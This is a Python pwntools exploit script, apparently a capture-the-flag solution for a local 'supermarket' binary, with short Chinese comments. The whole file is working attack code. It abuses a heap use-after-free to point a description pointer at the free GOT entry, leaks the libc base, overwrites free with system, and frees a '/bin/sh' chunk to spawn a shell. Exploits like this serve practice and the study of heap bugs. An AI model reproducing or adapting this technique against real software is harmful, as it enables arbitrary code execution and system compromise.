#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
a=process("./supermarket")
elf=ELF("./supermarket")
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
debug=0
if debug:
    gdb.attach(a,'''
    b *0x8048B07
    b *0x8048FBF
    ''')

def debug():
    gdb.attach(a,'''
    b *0x8048B07
    b *0x8048FB6
    b *0x8048FBF
    ''')
#malloc,change_price
def menu(index):
    a.recvuntil("your choice>> ")
    a.sendline(str(index))
def add(name,price,size,content):
    menu(1)
    a.recvuntil("name:")
    a.sendline(name)
    a.recv()
    a.sendline(str(price))
    a.recv()
    a.sendline(str(size))
    a.recv()
    a.sendline(content)
def delete(name):
    menu(2)
    a.recvuntil(":")
    a.sendline(name)
def listz():
    menu(3)
def change_price():
    menu(4)
def change_desc(name,size,content):
    menu(5)
    a.recvuntil(":")
    a.sendline(name)
    a.recv()
    a.sendline(str(size))
    a.recv()
    a.sendline(content)
free_got=elf.got["free"]
add("0",10,100,"AAAA")
add("1",10,10,"BBBB")
change_desc("0",200,"")#chunk0的description被free了。
add("2",10,60,"AAAA")#chunk2 申请到被free的chunk0的description chunk
add("3",10,10,"a")#chunk3 ，用来free的延迟绑定
delete("3")
add("4",10,10,"/bin/sh\x00")
#debug()
payload='\x32\x00\x00\x00'
payload+='\x00'*16
payload+=p32(0x3c)
payload+=p32(free_got)
change_desc("0",70,payload)#修改chunk2的description_ptr为puts_got
listz()
a.recvuntil(": price.0, des.")
libc_base=u32(a.recv(4))-libc.symbols["free"]
success("libc_base ==> 0x%x"%libc_base)
system_addr=libc_base+libc.symbols["system"]
#debug()
change_desc("2",0x3c,p32(system_addr))
delete("4")
a.interactive()